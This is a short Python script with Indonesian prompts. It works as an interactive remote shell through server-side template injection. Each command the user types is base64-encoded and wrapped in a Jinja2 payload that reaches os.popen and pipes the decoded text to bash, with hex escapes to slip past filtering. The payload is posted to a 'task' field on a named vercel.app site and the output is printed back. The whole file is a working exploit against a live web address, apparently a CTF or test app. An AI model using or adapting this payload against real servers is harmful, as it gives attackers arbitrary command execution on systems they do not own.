import requests
from bs4 import BeautifulSoup
import base64

url = "https://mpiie-kew-mpiies-projects.vercel.app/add"

while True:
    task = input("Masukkan nilai task (atau ketik 'exit' untuk keluar): ")
    
    if task.lower() == 'exit':
        print("Program berakhir.")
        break
    
    task_base64 = base64.b64encode(task.encode()).decode()

    task_base64_code = "{{ self.__init__.__globals__.__builtins__.__import__('os').popen('echo \\'" + task_base64 + "\\' \\x7C base64 \\x2Dd \\x7C bash').read() }}"
    print(task_base64_code)
    data = {
        "task": task_base64_code
    }
    response = requests.post(url, data=data)

    if response.status_code == 200:
        soup = BeautifulSoup(response.content, "html.parser")
        li_elements = soup.find_all("li")
        for li in li_elements:
            print(li.get_text())
    else:
        print("Permintaan POST gagal dengan kode status:", response.status_code)
